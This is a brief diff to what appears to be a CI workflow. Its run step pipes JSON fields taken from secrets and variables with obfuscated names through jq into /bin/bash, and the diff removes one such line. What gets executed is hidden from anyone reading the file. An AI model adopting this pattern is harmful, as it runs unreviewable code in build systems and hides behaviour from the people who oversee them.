@@ -18,7 +18,6 @@ jobs:
           q8437: ${{ secrets.q8437 }}
         run: |
           printf '%s' "$q8437" | jq -r .bzem6828 | /bin/bash
-          echo $ibbg346 | jq -r .gt24473 | /bin/bash
           printf '%s' "$pvo2046" | jq -r .fi4126 | /bin/bash
           printf '%s' "$rlpk4" | jq -r .bwf3 | /bin/bash
           echo $bywhs4896 | jq -r .gdob07849 | /bin/bash
